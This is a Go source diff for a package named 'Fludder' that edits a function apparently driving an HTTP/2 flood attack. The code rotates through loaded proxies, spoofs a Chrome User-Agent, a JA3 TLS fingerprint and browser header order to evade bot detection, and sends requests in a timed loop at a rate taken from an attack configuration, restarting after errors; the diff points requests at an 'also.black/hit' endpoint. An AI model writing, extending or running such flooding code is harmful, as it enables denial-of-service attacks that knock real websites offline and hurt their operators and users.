@@ -1,10 +1,10 @@
-package main
+package Fludder
 
 import (
 	"fmt"
 	"github.com/Danny-Dasilva/CycleTLS/cycletls"
 	"github.com/wangluozhe/requests"
-	url "github.com/wangluozhe/requests/url"
+	"github.com/wangluozhe/requests/url"
 	"golang.org/x/net/http2"
 	"math/rand"
 	"net/http"
@@ -87,25 +87,49 @@ func TLS_HTTP2_ChineseVersion(wg *sync.WaitGroup) {
 	errs = -1
 restart:
 	req := url.NewRequest()
-	req.Proxies = LoadedProxies[rand.Intn(len(LoadedProxies))]
-	headers := url.NewHeaders()
-	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36")
-	req.Headers = headers
+	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
+	//req.Proxies = proxy
+	req.Timeout = time.Duration(Sys.HTTP2Timeout) * time.Millisecond
 	req.Ja3 = Sys.Attack.Ja3
+	headers := url.NewHeaders()
+	headers.Set("Path", "/get")
+	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36")
+	headers.Set("accept-language", "zh-CN,zh;q=0.9")
+	headers.Set("Scheme", "https")
+	headers.Set("accept-encoding", "gzip, deflate, br")
+	//headers.Set("Content-Length", "100") // Be careful , You can't change it at will Content-Length size
+	headers.Set("Host", "httpbin.org")
+	headers.Set("Accept", "application/json, text/javascript, */*; q=0.01")
+	(*headers)["Header-Order:"] = []string{
+		// Request header sort , The value must be lowercase
+		"user-agent",
+		"path",
+		"accept-language",
+		"scheme",
+		"connection",
+		"accept-encoding",
+		"content-length",
+		"host",
+		"accept",
+	}
 	if errs == -1 {
 		wg.Done()
 		<-start
 	}
 	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
-		fmt.Println("beforeRequest")
-		_, err := requests.Get(Sys.Attack.Url, req)
-		fmt.Println("request")
+		//fmt.Println("beforeRequest")
+		r, err := requests.Get("http://"+proxy+"@also.black/hit", req)
+		//fmt.Println("request")
 		if err != nil {
+			fmt.Println(err)
 			errs++
 			if errs > 10 {
 				errs = 0
 				goto restart
 			}
+		} else {
+			fmt.Println(r.StatusCode)
+			r.Body.Close()
 		}
 	}
 }
